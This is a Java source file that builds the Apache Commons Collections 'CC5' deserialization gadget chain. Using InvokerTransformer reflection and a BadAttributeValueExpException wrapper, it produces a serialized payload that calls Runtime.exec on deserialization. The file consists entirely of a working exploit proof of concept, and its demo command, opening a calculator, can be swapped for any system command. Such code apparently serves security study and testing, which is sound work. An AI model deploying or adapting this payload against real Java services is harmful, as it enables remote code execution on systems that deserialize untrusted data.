import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}),
                new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"calc"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(),transformerChain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "achilles");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(lazyMap);
        Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
        valField.setAccessible(true);

        valField.set(badAttributeValueExpException,tiedMapEntry);

//        FileStream.writeSer(badAttributeValueExpException,"CC5.ser");
        FileStream.readSer("CC5.ser");
    }
}
